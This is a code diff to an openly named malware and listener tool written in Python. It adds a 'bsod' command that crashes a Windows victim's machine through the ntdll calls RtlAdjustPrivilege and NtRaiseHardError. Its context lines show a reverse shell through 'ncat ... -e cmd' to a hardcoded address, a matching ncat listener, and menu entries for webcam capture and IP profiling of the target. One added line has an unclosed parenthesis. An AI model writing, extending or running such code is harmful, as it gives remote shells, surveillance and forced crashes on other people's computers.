@@ -62,6 +62,7 @@ LISTENER_MENU_BANNER = ("""
  \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
  \033[97;1m║>>>\033[0m \033[91mzombie -l\033[0m      \033[97;1mStart zombie mode on the target machine Linux                     ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mzombie -w\033[0m      \033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mbsod\033[0m           \033[97;1mStart BSOD mode on the target machine                             ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mscreenshot\033[0m     \033[97;1mObtain the screenshot of the target machine webcam                ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
@@ -92,6 +93,7 @@ import requests
 import discord
 import pyautogui
 import cv2
+import ctypes
 import subprocess
 
 
@@ -110,6 +112,10 @@ def MALWARE():
            
         if MALWARE_RECV == "zombie -w":
            os.system("ncat 192.168.1.26 835 -e cmd")
+           
+        if MALWARE_RECV == "bsod":
+           ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+           ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))           
         
         if MALWARE_RECV == "ipinfo":
            IPINFO = requests.get("https://ipinfo.io/json")
@@ -193,6 +199,11 @@ def LISTENER():
            time.sleep(2)
            CONN.send("zombie -w".encode())
            os.system("ncat -lvnp 835")
+           
+        if LISTENER_INPUT == "bsod":
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting BSOD mode on the target machine...\033[0m")
+           time.sleep(2)
+           CONN.send("bsod".encode()
            
         if LISTENER_INPUT == "ipinfo":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the IP address information of the target machine...\033[0m")
